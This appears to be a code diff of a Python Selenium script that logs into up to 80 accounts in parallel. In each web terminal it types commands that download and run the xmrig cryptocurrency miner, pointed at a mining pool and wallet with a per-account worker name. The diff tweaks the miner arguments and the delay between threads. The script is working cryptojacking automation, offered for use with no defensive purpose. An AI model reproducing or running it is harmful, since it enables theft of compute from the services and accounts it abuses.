@@ -95,7 +95,7 @@ def open_browser(instance_number, email, password):
     try:
         textarea1 = wait.until(EC.presence_of_element_located((By.CLASS_NAME, "xterm-helper-textarea")))
         print("SUCCES")        
-        textarea1.send_keys(f"wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz\ntar -xvf xmrig-6.22.2-linux-static-x64.tar.gz\ncd xmrig-6.22.2\n./xmrig -a rx -o rx.bominers.com:3333 -u BONK:mA914pP63TTdq1c8igHEtrKQyhdwz36yVVbQeAR6YnD.{email}#PKJE8GRCCC -p x --threads=4 -k")
+        textarea1.send_keys(f"wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz\ntar -xvf xmrig-6.22.2-linux-static-x64.tar.gz\ncd xmrig-6.22.2\n./xmrig -a rx -o rx.bominers.com:3333 -u BONK:mA914pP63TTdq1c8igHEtrKQyhdwz36yVVbQeAR6YnD.{email} -p -k --threads=4")
         textarea1.send_keys(Keys.ENTER)
     except:
         print(f"[{email}] ❌ terminal not found ")
@@ -107,7 +107,7 @@ for i, (email, password) in enumerate(accounts[:80]):
     thread = threading.Thread(target=open_browser, args=(i, email, password))
     thread.start()
     threads.append(thread)
-    time.sleep(10)  # Prevent overload
+    time.sleep(20)  # Prevent overload
 
 for thread in threads:
     thread.join()
